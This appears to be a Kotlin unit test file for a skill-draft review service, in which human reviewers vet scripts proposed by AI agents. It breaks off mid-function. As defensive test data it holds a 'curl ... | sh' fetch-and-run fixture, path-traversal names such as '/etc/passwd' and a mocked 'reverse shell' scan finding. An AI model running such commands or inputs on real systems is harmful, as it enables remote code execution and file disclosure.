package com.agnetix.harnax.admin.service.impl

import com.agnetix.harnax.admin.constant.BuiltinRepository
import com.agnetix.harnax.admin.context.TenantContext
import com.agnetix.harnax.admin.dto.SkillDraftApproveRequest
import com.agnetix.harnax.admin.dto.SkillDraftDecisionResponse
import com.agnetix.harnax.admin.dto.SkillDraftRejectRequest
import com.agnetix.harnax.admin.dto.SkillDraftSubmitRequest
import com.agnetix.harnax.admin.exception.BizException
import com.agnetix.harnax.admin.service.SchedulerClient
import com.agnetix.harnax.admin.skill.SkillDraftCodec
import com.agnetix.harnax.admin.skill.SkillDraftPromoter
import com.agnetix.harnax.admin.skill.SkillReviewRecorder
import com.agnetix.harnax.admin.util.JwtUtil
import com.agnetix.harnax.common.dto.AgentTaskOwner
import com.agnetix.harnax.common.dto.ResultVo
import com.agnetix.harnax.common.session.TaskSessionId
import com.agnetix.harnax.entity.Session
import com.agnetix.harnax.entity.Skill
import com.agnetix.harnax.entity.SkillDraft
import com.agnetix.harnax.entity.SkillRepository
import com.agnetix.harnax.entity.SkillReviewLog
import com.agnetix.harnax.entity.dto.ChannelSessionOwner
import com.agnetix.harnax.mapper.ChannelMapper
import com.agnetix.harnax.mapper.SessionMapper
import com.agnetix.harnax.mapper.SkillDraftMapper
import com.agnetix.harnax.mapper.SkillMapper
import com.github.pagehelper.PageHelper
import org.junit.jupiter.api.AfterEach
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertNull
import org.junit.jupiter.api.Assertions.assertThrows
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.BeforeEach
import org.junit.jupiter.api.DisplayName
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.extension.ExtendWith
import org.mockito.Mock
import org.mockito.Mockito.never
import org.mockito.Mockito.verify
import org.mockito.Mockito.`when`
import org.mockito.junit.jupiter.MockitoExtension
import org.mockito.junit.jupiter.MockitoSettings
import org.mockito.kotlin.any
import org.mockito.kotlin.anyOrNull
import org.mockito.kotlin.argumentCaptor
import org.mockito.kotlin.eq
import org.mockito.quality.Strictness
import org.springframework.mock.web.MockHttpServletRequest
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken
import org.springframework.security.core.authority.SimpleGrantedAuthority
import org.springframework.security.core.context.SecurityContextHolder
import org.springframework.web.context.request.RequestContextHolder
import org.springframework.web.context.request.ServletRequestAttributes
import java.time.LocalDateTime

/**
 * SkillDraftServiceImpl unit tests: who a proposal is filed against, and what a reviewer ends up reading.
 *
 * The intake route is the one place an agent's own words decide which tenant sees a draft, so most of these
 * assert what was refused and whose tenant the accepted row got. The rest pins the two derived columns a
 * reviewer decides on — the per-script hash and the canonical file JSON — because the approve step later
 * compares a digest over exactly those bytes, and a submit that stored files in arrival order would make
 * that comparison describe a different skill than the one displayed.
 *
 * The decision tests then hold the other side of the same invariant: a draft that is not the caller's, or not
 * the content the reviewer read, or already decided, must not reach the skill table at all. And the gate has
 * to know who it is gating — a proposal's own author holds the same internal secret every sandbox runs with,
 * so the tests below also assert that bearer gets nothing from the review half.
 *
 * @author agnetix
 * @since 2026-10-05
 */
@ExtendWith(MockitoExtension::class)
@MockitoSettings(strictness = Strictness.LENIENT)
class SkillDraftServiceImplTest {

    @Mock
    private lateinit var skillDraftMapper: SkillDraftMapper

    @Mock
    private lateinit var sessionMapper: SessionMapper

    @Mock
    private lateinit var channelMapper: ChannelMapper

    @Mock
    private lateinit var schedulerClient: SchedulerClient

    @Mock
    private lateinit var skillReviewRecorder: SkillReviewRecorder

    @Mock
    private lateinit var skillMapper: SkillMapper

    @Mock
    private lateinit var skillDraftPromoter: SkillDraftPromoter

    @Mock
    private lateinit var jwtUtil: JwtUtil

    private lateinit var service: SkillDraftServiceImpl

    @BeforeEach
    fun setUp() {
        service = SkillDraftServiceImpl(
            skillDraftMapper = skillDraftMapper,
            sessionMapper = sessionMapper,
            channelMapper = channelMapper,
            schedulerClient = schedulerClient,
            skillReviewRecorder = skillReviewRecorder,
            skillMapper = skillMapper,
            skillDraftPromoter = skillDraftPromoter,
            jwtUtil = jwtUtil,
        )
        // A generated key is what the mapper writes back; the mock has to, or the returned id says nothing
        `when`(skillDraftMapper.insert(any())).thenAnswer { invocation ->
            invocation.getArgument<SkillDraft>(0).id = NEW_ID
            1
        }
        // A decision is stamped with who made it, and that name comes off the request's own token
        val mockRequest = MockHttpServletRequest()
        mockRequest.addHeader("Authorization", "Bearer mock-token")
        RequestContextHolder.setRequestAttributes(ServletRequestAttributes(mockRequest))
        `when`(jwtUtil.validateToken(any())).thenReturn(true)
        `when`(jwtUtil.getUsernameFromToken(any())).thenReturn(REVIEWER)
    }

    @AfterEach
    fun tearDown() {
        TenantContext.clear()
        RequestContextHolder.resetRequestAttributes()
        // The principal is a static holder; a gate test that installs one would otherwise decide the next test
        SecurityContextHolder.clearContext()
        // A paging call arms PageHelper's ThreadLocal and only a real query consumes it
        PageHelper.clearPage()
    }

    private fun stubWebSession(
        tenantId: Long = TENANT,
        agentId: Long? = 3L,
    ) {
        `when`(sessionMapper.selectBySessionIdAndStatus(WEB_SESSION, 1)).thenReturn(
            Session().apply {
                sessionId = WEB_SESSION
                this.tenantId = tenantId
                this.agentId = agentId
            },
        )
    }

    private fun submit(
        sessionId: String? = WEB_SESSION,
        name: String? = "invoice-fill",
        description: String? = "Fill an invoice from a table",
        skillmd: String? = "# invoice-fill\n\nUse it when asked.",
        resources: Map<String, String>? = null,
        scanVerdict: String? = "SAFE",
        scanFindings: List<String>? = null,
    ): Long = service.submit(
        SkillDraftSubmitRequest(
            sessionId = sessionId,
            name = name,
            description = description,
            skillmd = skillmd,
            resources = resources,
            scanVerdict = scanVerdict,
            scanFindings = scanFindings,
        ),
    )

    private fun capturedInsert(): SkillDraft = argumentCaptor<SkillDraft>().let { captor ->
        verify(skillDraftMapper).insert(captor.capture())
        captor.firstValue
    }

    private fun capturedUpdate(): SkillDraft = argumentCaptor<SkillDraft>().let { captor ->
        verify(skillDraftMapper).updateContent(captor.capture())
        captor.firstValue
    }

    @Test
    @DisplayName("a session admin cannot place in a tenant gets nothing queued")
    fun `an unresolvable session is refused`() {
        `when`(sessionMapper.selectBySessionIdAndStatus(WEB_SESSION, 1)).thenReturn(null)

        val refused = assertThrows(BizException::class.java) { submit() }

        assertEquals(404, refused.code)
        assertTrue(refused.message!!.contains(WEB_SESSION), "the refusal has to name the id it could not place")
        verify(skillDraftMapper, never()).insert(any())
        verify(skillReviewRecorder, never()).recordDraft(any(), any(), anyOrNull(), anyOrNull(), anyOrNull())
    }

    @Test
    @DisplayName("a session row with no tenant stamped is as unattributable as no row at all")
    fun `a zero tenant is refused`() {
        stubWebSession(tenantId = 0L)

        assertThrows(BizException::class.java) { submit() }

        verify(skillDraftMapper, never()).insert(any())
    }

    @Test
    @DisplayName("the proposal is filed against the session's tenant and agent, not against what the caller claims")
    fun `ownership comes from the session`() {
        stubWebSession(tenantId = 9L, agentId = 42L)

        val id = submit()

        assertEquals(NEW_ID, id)
        val stored = capturedInsert()
        assertEquals(9L, stored.tenantId)
        assertEquals(42L, stored.agentId)
        assertEquals(WEB_SESSION, stored.sourceSessionId)
        assertEquals(SkillDraft.STATUS_PENDING, stored.status, "intake never arrives decided")
        assertNull(stored.reviewedBy)
        verify(skillReviewRecorder).recordDraft(
            draftId = eq(NEW_ID),
            action = eq(SkillReviewLog.ACTION_PROPOSE),
            detail = anyOrNull(),
            tenantId = eq(9L),
            actor = eq(SkillReviewLog.ACTOR_AGENT),
        )
    }

    @Test
    @DisplayName("a channel conversation queues into its channel's tenant")
    fun `channel sessions resolve through the channel table`() {
        `when`(channelMapper.selectOwnerBySessionId("chn-7")).thenReturn(
            ChannelSessionOwner().apply {
                sessionId = "chn-7"
                tenantId = 5L
                agentId = 8L
            },
        )

        submit(sessionId = "chn-7")

        val stored = capturedInsert()
        assertEquals(5L, stored.tenantId)
        assertEquals(8L, stored.agentId)
        verify(sessionMapper, never()).selectBySessionIdAndStatus(any(), any())
    }

    @Test
    @DisplayName("a scheduled run is filed against the tenant its task row says, not the agent id in the session id")
    fun `task sessions resolve through the scheduler's own row`() {
        val sessionId = TaskSessionId.of(taskId = 11L, agentId = 4L)
        stubTaskOwner(taskId = 11L, tenantId = 6L, agentId = 4L)

        submit(sessionId = sessionId)

        val stored = capturedInsert()
        assertEquals(6L, stored.tenantId)
        assertEquals(4L, stored.agentId, "the agent the task runs is what the reviewer is shown as the author")
    }

    @Test
    @DisplayName("a task session naming an agent its task does not run is refused")
    fun `a claimed agent that the task does not run is refused`() {
        val sessionId = TaskSessionId.of(taskId = 11L, agentId = 4L)
        stubTaskOwner(taskId = 11L, tenantId = 6L, agentId = 77L)

        val refused = assertThrows(BizException::class.java) { submit(sessionId = sessionId) }

        assertEquals(404, refused.code)
        verify(skillDraftMapper, never()).insert(any())
    }

    @Test
    @DisplayName("a scheduler that cannot confirm the task refuses the proposal instead of trusting the id")
    fun `an unconfirmed task has no tenant to enter`() {
        val sessionId = TaskSessionId.of(taskId = 11L, agentId = 4L)
        `when`(schedulerClient.taskOwner(11L)).thenReturn(ResultVo.error("Scheduler service unavailable"))

        assertThrows(BizException::class.java) { submit(sessionId = sessionId) }

        verify(skillDraftMapper, never()).insert(any())
    }

    private fun stubTaskOwner(
        taskId: Long,
        tenantId: Long,
        agentId: Long,
    ) {
        `when`(schedulerClient.taskOwner(taskId)).thenReturn(
            ResultVo.success(AgentTaskOwner(creator = "alice", tenantId = tenantId, agentId = agentId)),
        )
    }

    @Test
    @DisplayName("the second proposal of an open draft patches it instead of stacking a copy")
    fun `an open draft of the same name is merged`() {
        stubWebSession()
        `when`(skillDraftMapper.selectPendingByTenantAndName(TENANT, "invoice-fill")).thenReturn(
            SkillDraft().apply {
                id = 12L
                name = "invoice-fill"
            },
        )
        `when`(skillDraftMapper.updateContent(any())).thenReturn(1)

        val id = submit()

        assertEquals(12L, id, "the reviewer opens one draft per skill, so the merge answer is the row they see")
        assertEquals(12L, capturedUpdate().id)
        verify(skillDraftMapper, never()).insert(any())
    }

    @Test
    @DisplayName("a draft decided between the read and the write becomes a new proposal")
    fun `a merge that lost the race requeues`() {
        stubWebSession()
        `when`(skillDraftMapper.selectPendingByTenantAndName(TENANT, "invoice-fill")).thenReturn(
            SkillDraft().apply {
                id = 12L
                name = "invoice-fill"
            },
        )
        `when`(skillDraftMapper.updateContent(any())).thenReturn(0)
        // The mapper writes the generated key back into the row it is handed, so the id the requeue must
        // not carry is only observable at the moment of the write.
        var idAtInsert = -1L
        `when`(skillDraftMapper.insert(any())).thenAnswer { invocation ->
            val row = invocation.getArgument<SkillDraft>(0)
            idAtInsert = row.id
            row.id = NEW_ID
            1
        }

        val id = submit()

        assertEquals(NEW_ID, id)
        assertEquals(0L, idAtInsert, "a new row must not be inserted under the decided row's id")
        verify(skillReviewRecorder).recordDraft(
            draftId = eq(NEW_ID),
            action = eq(SkillReviewLog.ACTION_PROPOSE),
            detail = anyOrNull(),
            tenantId = eq(TENANT),
            actor = eq(SkillReviewLog.ACTOR_AGENT),
        )
    }

    @Test
    @DisplayName("support files are stored as canonical JSON with a hash per script")
    fun `files are stored so a digest can be recomputed`() {
        stubWebSession()

        submit(
            resources = mapOf(
                "scripts/zz.sh" to "echo second\n",
                "references/a.md" to "# ref",
                "scripts/ab.sh" to "echo first\n",
            ),
        )

        val stored = capturedInsert()
        assertEquals(
            """{"references/a.md":"# ref","scripts/ab.sh":"echo first\n","scripts/zz.sh":"echo second\n"}""",
            stored.resources,
            "sorted keys, so the same content always stores the same bytes",
        )
        val previews = stored.scriptPreviews!!
        assertTrue(previews.indexOf("scripts/ab.sh") < previews.indexOf("scripts/zz.sh"), "previews are in path order")
        assertFalse(previews.contains("references/a.md"), "only scripts get a preview; a reference is not executed")
        // sha256 of "echo first\n" as an independent implementation computed it; the reviewer compares this
        // against the hash the sandbox reported for the same file
        assertTrue(
            previews.contains("\"sha256\":\"93fa6d2343372bd5d804d19068d4793afdf000a3ca9f62c9aefdcb1ea992db9d\""),
            "each preview carries the hash of the whole file: $previews",
        )
        assertTrue(previews.contains("totalLines\":2"), "the line count tells the reviewer how much they are not seeing: $previews")
    }

    @Test
    @DisplayName("an unrecognised scan verdict costs the note, not the proposal")
    fun `a verdict outside the upstream enum is dropped`() {
        stubWebSession()

        submit(scanVerdict = "probably-fine")

        assertNull(capturedInsert().scanVerdict)
    }

    @Test
    @DisplayName("a refusal names the value it would not store")
    fun `invalid proposals are refused with their own reason`() {
        stubWebSession()

        assertThrows(BizException::class.java) { submit(name = " ") }.also {
            assertTrue(it.message!!.contains("name"), it.message ?: "")
        }
        assertThrows(BizException::class.java) { submit(name = "n".repeat(101)) }.also {
            assertTrue(it.message!!.contains("100"), it.message ?: "")
        }
        assertThrows(BizException::class.java) { submit(skillmd = "   ") }.also {
            assertTrue(it.message!!.contains("skillmd"), it.message ?: "")
        }
        assertThrows(BizException::class.java) { submit(resources = mapOf("../escape.md" to "x")) }.also {
            assertTrue(it.message!!.contains("../escape.md"), it.message ?: "")
        }
        assertThrows(BizException::class.java) { submit(resources = mapOf("/etc/passwd" to "x")) }.also {
            assertTrue(it.message!!.contains("/etc/passwd"), it.message ?: "")
        }
        verify(skillDraftMapper, never()).insert(any())
    }

    @Test
    @DisplayName("one proposal is bounded in files and bytes, since nothing bounds how often an agent may patch")
    fun `an oversized proposal is refused`() {
        stubWebSession()

        val tooMany = (1..65).associate { "scripts/$it.sh" to "echo $it" }
        assertThrows(BizException::class.java) { submit(resources = tooMany) }

        val tooBig = mapOf("scripts/big.sh" to "x".repeat(2_000_001))
        assertThrows(BizException::class.java) { submit(resources = tooBig) }

        verify(skillDraftMapper, never()).insert(any())
    }

    // ------------------------------------------------------------------ decisions

    /**
     * A draft the way the queue stores one: canonical file JSON plus the previews derived from it, which are
     * the two columns the digest is taken over. Building it here instead of handing the service a bare row is
     * what makes the digest assertions below say something about stored bytes.
     */
    private fun storedDraft(
        id: Long = DRAFT_ID,
        tenantId: Long = TENANT,
        name: String = "invoice-fill",
        sourceSessionId: String = WEB_SESSION,
        skillmd: String = "# invoice-fill\n\nFill an invoice from a table.",
        resources: Map<String, String> = emptyMap(),
        state: String = SkillDraft.STATUS_PENDING,
        reviewedBy: String? = null,
        reviewedAt: LocalDateTime? = null,
        rejectReason: String? = null,
    ): SkillDraft = SkillDraft().apply {
        this.id = id
        this.tenantId = tenantId
        this.name = name
        this.skillmd = skillmd
        description = "Fill an invoice from a table"
        this.resources = SkillDraftCodec.resourcesJson(resources)
        scriptPreviews = SkillDraftCodec.scriptPreviewsJson(resources)
        status = state
        this.sourceSessionId = sourceSessionId
        agentId = 3L
        this.reviewedBy = reviewedBy
        this.reviewedAt = reviewedAt
        this.rejectReason = rejectReason
    }

    /** Opens the review half as a reviewer of [draft]'s own workspace, with that one row readable. */
    private fun reviewerReads(draft: SkillDraft) {
        TenantContext.setTenantId(draft.tenantId)
        `when`(skillDraftMapper.selectById(draft.id)).thenReturn(draft)
    }

    private fun stubLandingRepository() {
        `when`(skillDraftPromoter.landingRepository(TENANT)).thenReturn(
            SkillRepository().apply {
                id = LANDING_REPO_ID
                tenantId = TENANT
                name = BuiltinRepository.AGENT_SKILLS
                status = 1
            },
        )
    }

    @Test
    @DisplayName("the queue the reviewer reads is their own tenant's, filtered exactly as asked")
    fun `page is tenant scoped`() {
        TenantContext.setTenantId(3L)
        `when`(skillDraftMapper.selectDraftList(eq(3L), anyOrNull(), anyOrNull(), anyOrNull()))
            .thenReturn(listOf(storedDraft(tenantId = 3L)))

        val page = service.page(status = "pending", name = " invoice ", sessionId = null, pageNum = 1, pageSize = 20)

        assertEquals(1, page.records.size)
        assertEquals("invoice-fill", page.records.first().name)
        assertEquals(0, page.records.first().upstreamFindingCount)
        verify(skillDraftMapper).selectDraftList(eq(3L), eq("PENDING"), eq("invoice"), anyOrNull())
    }

    @Test
    @DisplayName("a conversation filter is a SQL predicate, not a trim applied after paging")
    fun `the session filter travels down to the query`() {
        TenantContext.setTenantId(3L)
        `when`(skillDraftMapper.selectDraftList(eq(3L), anyOrNull(), anyOrNull(), anyOrNull()))
            .thenReturn(listOf(storedDraft(tenantId = 3L)))

        service.page(status = "PENDING", name = null, sessionId = "ses-1", pageNum = 1, pageSize = 20)

        verify(skillDraftMapper).selectDraftList(eq(3L), eq("PENDING"), anyOrNull(), eq("ses-1"))
    }

    @Test
    @DisplayName("a blank conversation filter answers empty rather than widening to the tenant")
    fun `a blank session id is not the whole queue`() {
        TenantContext.setTenantId(3L)
        `when`(skillDraftMapper.selectDraftList(eq(3L), anyOrNull(), anyOrNull(), anyOrNull()))
            .thenReturn(listOf(storedDraft(tenantId = 3L)))

        val page = service.page(status = null, name = null, sessionId = "  ", pageNum = 1, pageSize = 20)

        assertEquals(0, page.records.size, "a caller that named a conversation and sent only whitespace gets no rows")
        assertEquals(0L, page.total)
        // The query itself, not just its answer: dropping the predicate is what would hand this panel another
        // conversation's PENDING nominations, and one neighbour row is enough to do that.
        verify(skillDraftMapper, never()).selectDraftList(any(), anyOrNull(), anyOrNull(), anyOrNull())
    }

    @Test
    @DisplayName("no conversation filter stays the reviewer's whole tenant")
    fun `an absent session id keeps the tenant-wide queue`() {
        TenantContext.setTenantId(3L)
        `when`(skillDraftMapper.selectDraftList(eq(3L), anyOrNull(), anyOrNull(), anyOrNull()))
            .thenReturn(listOf(storedDraft(tenantId = 3L, sourceSessionId = "ses-9")))

        val page = service.page(status = "PENDING", name = null, sessionId = null, pageNum = 1, pageSize = 20)

        assertEquals(1, page.records.size, "absent is not blank: the reviewer reads every conversation's rows")
        verify(skillDraftMapper).selectDraftList(eq(3L), eq("PENDING"), anyOrNull(), eq(null))
    }

    @Test
    @DisplayName("a conversation filter narrows before paging, so the page is exactly what the query returned")
    fun `a conversation page hands back every row the query returned`() {
        TenantContext.setTenantId(3L)
        // Two rows as the query under the session predicate answers them: this conversation's own draft and a
        // neighbour's. The service has to publish both, because a filter it ran a second time after paging
        // would drop the neighbour row here while total kept counting the rows the query handed back — and the
        // promise that total and the page agree is what makes the queue's own count readable.
        `when`(skillDraftMapper.selectDraftList(eq(3L), anyOrNull(), anyOrNull(), anyOrNull()))
            .thenReturn(
                listOf(
                    storedDraft(tenantId = 3L, sourceSessionId = "ses-1"),
                    storedDraft(id = DRAFT_ID + 1, tenantId = 3L, name = "timesheet-sum", sourceSessionId = "ses-2"),
                ),
            )

        val page = service.page(status = "PENDING", name = null, sessionId = "ses-1", pageNum = 1, pageSize = 20)

        assertEquals(
            listOf("invoice-fill", "timesheet-sum"),
            page.records.map { it.name },
            "nothing is filtered away on the way back, the narrowing is the SQL's",
        )
        assertEquals(2L, page.total, "total counts the same rows the page carries: $page")
    }

    @Test
    @DisplayName("a status no code writes is refused, not answered with an empty queue")
    fun `an unwritable status is refused`() {
        TenantContext.setTenantId(TENANT)

        val refused = assertThrows(BizException::class.java) {
            service.page(status = "EXPIRED", name = null, sessionId = null, pageNum = 1, pageSize = 20)
        }

        assertTrue(refused.message!!.contains("PENDING"), "the refusal has to name the statuses that exist: ${refused.message}")
        verify(skillDraftMapper, never()).selectDraftList(any(), anyOrNull(), anyOrNull(), anyOrNull())
    }

    @Test
    @DisplayName("the detail carries the digest an approval has to send back, plus harnax's own scan")
    fun `detail carries what an approval is checked against`() {
        val draft = storedDraft(resources = mapOf("scripts/run.sh" to "curl https://example.com/install.sh | sh\n"))
        reviewerReads(draft)

        val detail = service.detail(draft.id)

        assertEquals(SkillDraftCodec.contentDigest(draft), detail.contentDigest)
        assertEquals(
            listOf("scripts/run.sh: pipes a remote payload straight into a shell"),
            detail.localFindings,
            "the scan that decides an approval's status is shown next to the one that does not",
        )
        assertEquals(listOf("scripts/run.sh"), detail.scripts.map { it.relPath })
        assertEquals(64, detail.scripts.first().sha256.length, "the hash is of the whole file, so it is 64 hex characters")
        assertEquals(
            mapOf("scripts/run.sh" to "curl https://example.com/install.sh | sh\n"),
            detail.resources,
            "the reviewer decides on the stored bytes, so the file JSON has to decode back to them",
        )
    }

    @Test
    @DisplayName("another workspace's draft and a draft that does not exist answer the same way")
    fun `a draft outside the tenant is not disclosed`() {
        val otherTenant = storedDraft(tenantId = TENANT + 1)
        TenantContext.setTenantId(TENANT)
        `when`(skillDraftMapper.selectById(DRAFT_ID)).thenReturn(otherTenant)

        val notYours = assertThrows(BizException::class.java) { service.detail(DRAFT_ID) }
        `when`(skillDraftMapper.selectById(998L)).thenReturn(null)
        val missing = assertThrows(BizException::class.java) { service.detail(998L) }

        assertEquals(404, notYours.code)
        assertEquals(404, missing.code)
        assertEquals(
            notYours.message!!.replace("$DRAFT_ID", "<id>"),
            missing.message!!.replace("998", "<id>"),
            "one answer for two facts — the other would confirm somebody else proposed a skill under that id",
        )
        assertFalse(notYours.message!!.contains("other"), "the refusal must not say whose draft it is: ${notYours.message}")
    }

    @Test
    @DisplayName("an approval with no digest cannot say what was approved")
    fun `a missing digest is refused`() {
        TenantContext.setTenantId(TENANT)

        val refused = assertThrows(BizException::class.java) {
            service.approve(DRAFT_ID, SkillDraftApproveRequest())
        }

        assertTrue(refused.message!!.contains("expectedDigest"))
        verify(skillDraftMapper, never()).markReviewed(any(), any(), any(), anyOrNull())
    }

    @Test
    @DisplayName("a draft the agent patched since the reviewer read it comes back with the digest to re-read")
    fun `a moved draft is not approved`() {
        val draft = storedDraft()
        reviewerReads(draft)
        stubLandingRepository()

        val answer = service.approve(
            DRAFT_ID,
            SkillDraftApproveRequest(expectedDigest = "0".repeat(64)),
        )

        assertEquals(SkillDraftDecisionResponse.OUTCOME_DRAFT_CHANGED, answer.outcome)
        assertEquals(SkillDraftCodec.contentDigest(draft), answer.currentDigest)
        verify(skillDraftMapper, never()).markReviewed(any(), any(), any(), anyOrNull())
        verify(skillDraftPromoter, never()).promote(any(), any(), any(), any())
    }

    @Test
    @DisplayName("a taken name is a choice, so neither a silent overwrite nor a silent suffix happens")
    fun `a name conflict is answered as a conflict`() {
        val draft = storedDraft()
        reviewerReads(draft)
        stubLandingRepository()
        `when`(skillMapper.selectByNameAndRepo(any(), eq(LANDING_REPO_ID))).thenReturn(
            Skill().apply {
                id = 91L
                name = "invoice-fill"
            },
        )

        val digest = SkillDraftCodec.contentDigest(draft)
        val undecided = service.approve(DRAFT_ID, SkillDraftApproveRequest(expectedDigest = digest))
        val renamedOntoTaken = service.approve(
            DRAFT_ID,
            SkillDraftApproveRequest(expectedDigest = digest, conflictResolution = "rename", newName = "invoice-fill-v2"),
        )

        assertEquals(SkillDraftDecisionResponse.OUTCOME_NAME_TAKEN, undecided.outcome)
        assertEquals(91L, undecided.skillId, "the row in the way has to be named, or replace is a guess")
        assertEquals(SkillDraftDecisionResponse.OUTCOME_NAME_TAKEN, renamedOntoTaken.outcome)
        assertTrue(renamedOntoTaken.reason!!.contains("invoice-fill-v2"), "the refusal names the name it checked: ${renamedOntoTaken.reason}")
        verify(skillDraftMapper, never()).markReviewed(any(), any(), any(), anyOrNull())
        verify(skillDraftPromoter, never()).promote(any(), any(), any(), any())
    }

    @Test
    @DisplayName("an approval claims the draft, writes the skill through the promoter and records both sides")
    fun `an approval promotes and records`() {
        val draft = storedDraft()
        reviewerReads(draft)
        stubLandingRepository()
        `when`(skillDraftMapper.markReviewed(eq(DRAFT_ID), eq(SkillDraft.STATUS_APPROVED), eq(REVIEWER), anyOrNull())).thenReturn(1)
        `when`(skillDraftPromoter.promote(any(), any(), any(), any())).thenReturn(
            SkillDraftPromoter.Promotion(skillId = 77L, status = 0, name = "invoice-fill", findings = listOf("SKILL.md: opens a reverse shell")),
        )

        val answer = service.approve(
            DRAFT_ID,
            SkillDraftApproveRequest(expectedDigest = SkillDraftCodec.contentDigest(draft), conflictResolution = "RENAME", newName = " invoice-pdf "),
        )

        assertEquals(SkillDraftDecisionResponse.OUTCOME_PROMOTED, answer.outcome)
        assertEquals(77L, answer.skillId)
        assertEquals(0, answer.skillStatus, "a scan hit means the reviewer has one more action, not that the approval failed")
        val names = argumentCaptor<String>()
        verify(skillDraftPromoter).promote(eq(draft), any(), names.capture(), eq(REVIEWER))
        assertEquals("invoice-pdf", names.firstValue, "a rename is trimmed and then stored under exactly that name")
        verify(skillReviewRecorder).recordDraft(
            draftId = eq(DRAFT_ID),
            action = eq(SkillReviewLog.ACTION_APPROVE),
            detail = anyOrNull(),
            tenantId = eq(TENANT),
            actor = eq(REVIEWER),
        )
        verify(skillReviewRecorder).recordSkill(
            skillId = eq(77L),
            action = eq(SkillReviewLog.ACTION_APPROVE),
            detail = anyOrNull(),
            tenantId = eq(TENANT),
            actor = eq(REVIEWER),
        )
    }

    @Test
    @DisplayName("a claim that lost the race reports the decision that beat it and writes nothing")
    fun `a lost claim is not a promotion`() {
        val draft = storedDraft()
        reviewerReads(draft)
        stubLandingRepository()
        // The row is read once before the claim and again after it fails, and the second read carries the
        // decision that got there first.
        `when`(skillDraftMapper.selectById(DRAFT_ID)).thenReturn(draft, storedDraft(state = SkillDraft.STATUS_APPROVED, reviewedBy = "other-admin"))
        `when`(skillDraftMapper.markReviewed(eq(DRAFT_ID), eq(SkillDraft.STATUS_APPROVED), eq(REVIEWER), anyOrNull())).thenReturn(0)

        val answer = service.approve(DRAFT_ID, SkillDraftApproveRequest(expectedDigest = SkillDraftCodec.contentDigest(draft)))

        assertEquals(SkillDraftDecisionResponse.OUTCOME_ALREADY_REVIEWED, answer.outcome)
        assertEquals("other-admin", answer.reviewedBy)
        verify(skillDraftPromoter, never()).promote(any(), any(), any(), any())
        verify(skillReviewRecorder, never()).recordSkill(any(), any(), anyOrNull(), anyOrNull(), anyOrNull())
    }

    @Test
    @DisplayName("a draft already decided cannot be decided again")
    fun `a decided draft answers with its decision`() {
        val decided = storedDraft(state = SkillDraft.STATUS_REJECTED, reviewedBy = "other-admin", rejectReason = "duplicates an existing skill")
        reviewerReads(decided)

        val answer = service.approve(DRAFT_ID, SkillDraftApproveRequest(expectedDigest = SkillDraftCodec.contentDigest(decided)))

        assertEquals(SkillDraftDecisionResponse.OUTCOME_ALREADY_REVIEWED, answer.outcome)
        assertEquals("duplicates an existing skill", answer.rejectReason)
        verify(skillDraftMapper, never()).markReviewed(any(), any(), any(), anyOrNull())
    }

    @Test
    @DisplayName("a rejection stores its reason, and is the only decision that needs one")
    fun `a rejection needs a reason`() {
        val draft = storedDraft()
        reviewerReads(draft)
        `when`(skillDraftMapper.markReviewed(eq(DRAFT_ID), eq(SkillDraft.STATUS_REJECTED), eq(REVIEWER), eq("too broad"))).thenReturn(1)

        val answer = service.reject(DRAFT_ID, SkillDraftRejectRequest(reason = " too broad "))
        assertEquals(SkillDraftDecisionResponse.OUTCOME_REJECTED, answer.outcome)
        assertEquals("too broad", answer.reason)
        verify(skillReviewRecorder).recordDraft(
            draftId = eq(DRAFT_ID),
            action = eq(SkillReviewLog.ACTION_REJECT),
            detail = anyOrNull(),
            tenantId = eq(TENANT),
            actor = eq(REVIEWER),
        )
        verify(skillDraftPromoter, never()).landingRepository(any())

        assertThrows(BizException::class.java) { service.reject(DRAFT_ID, SkillDraftRejectRequest(reason = "   ")) }
        val oversized = assertThrows(BizException::class.java) {
            service.reject(DRAFT_ID, SkillDraftRejectRequest(reason = "r".repeat(513)))
        }
        assertTrue(oversized.message!!.contains("512"), "the refusal names the column width: ${oversized.message}")
    }

    @Test
    @DisplayName("a rejection of another workspace's draft never reaches the queue")
    fun `a rejection is tenant scoped too`() {
        TenantContext.setTenantId(TENANT)
        `when`(skillDraftMapper.selectById(DRAFT_ID)).thenReturn(storedDraft(tenantId = TENANT + 1))

        val refused = assertThrows(BizException::class.java) { service.reject(DRAFT_ID, SkillDraftRejectRequest(reason = "no")) }

        assertEquals(404, refused.code)
        verify(skillDraftMapper, never()).markReviewed(any(), any(), any(), anyOrNull())
    }

    @Test
    @DisplayName("the secret a sandbox runs with cannot read or decide its own queue")
    fun `the internal service principal is refused at the gate`() {
        val draft = storedDraft()
        reviewerReads(draft)
        // A workspace is resolved on purpose: the refusal below has to be about who is asking, not about a
        // missing tenant the same caller would also trip.
        authenticateInternalService()

        listOf(
            assertThrows(BizException::class.java) {
                service.page(status = null, name = null, sessionId = null, pageNum = 1, pageSize = 20)
            },
            assertThrows(BizException::class.java) { service.detail(DRAFT_ID) },
            assertThrows(BizException::class.java) {
                service.approve(DRAFT_ID, SkillDraftApproveRequest(expectedDigest = SkillDraftCodec.contentDigest(draft)))
            },
            assertThrows(BizException::class.java) { service.reject(DRAFT_ID, SkillDraftRejectRequest(reason = "self-approved")) },
        ).forEach { refused ->
            assertEquals(403, refused.code, "a proposal's author gets a refusal, not a queue: ${refused.message}")
        }
        verify(skillDraftMapper, never()).selectById(any())
        verify(skillDraftMapper, never()).markReviewed(any(), any(), any(), anyOrNull())
        verify(skillDraftPromoter, never()).promote(any(), any(), any(), any())
    }

    @Test
    @DisplayName("a caller with no workspace of its own is not handed tenant 1's queue")
    fun `an unattributed review request is refused`() {
        TenantContext.clear()
        // No header, no tenant claim, no account row: the lenient chain would file this under the default
        // workspace, which is the one queue an unattributed call has no business reading.
        `when`(skillDraftMapper.selectDraftList(eq(1L), anyOrNull(), anyOrNull(), anyOrNull())).thenReturn(emptyList())

        val refused = assertThrows(BizException::class.java) {
            service.page(status = null, name = null, sessionId = null, pageNum = 1, pageSize = 20)
        }

        assertEquals(403, refused.code)
        verify(skillDraftMapper, never()).selectDraftList(any(), anyOrNull(), anyOrNull(), anyOrNull())
    }

    /** The principal `JwtAuthenticationFilter` installs for a bearer that is the shared internal secret. */
    private fun authenticateInternalService() {
        SecurityContextHolder.getContext().authentication = UsernamePasswordAuthenticationToken(
